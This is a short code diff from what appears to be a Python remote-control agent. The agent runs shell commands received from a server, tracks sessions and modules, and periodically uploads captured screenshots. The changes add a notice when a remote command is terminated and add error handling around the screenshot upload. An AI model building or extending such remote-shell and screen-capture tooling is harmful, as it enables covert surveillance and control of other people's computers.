@@ -207,6 +207,7 @@ while 1:
                     elif self.data['mode'] == 'terminateProcess':
                         if COMMANDS.has_key(self.data['payload']):
                             COMMANDS[self.data['payload']].stop()
+                            data_send('endCommandExecute', 'shellMode', session_id=self.data['session_id'], module_id=self.data['module_id'])
                         return
 
                     # Shell Mode
@@ -390,7 +391,10 @@ while 1:
                 config = init()
                 if config['sts'] and len(SCREENSHOT_LOGS) > 0 and ACTIVE:
                     for i in SCREENSHOT_LOGS.keys():
-                        data_send(str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
+                        try:
+                            data_send(str(SCREENSHOT_LOGS[i]), 'screenshotLogs')
+                        except KeyError:
+                            pass
                     SCREENSHOT_LOGS = {}
                 screen_scheduler = sched.scheduler(time.time, time.sleep)
                 screen_scheduler.enter(config['st'], 1, send_screenshot, ())
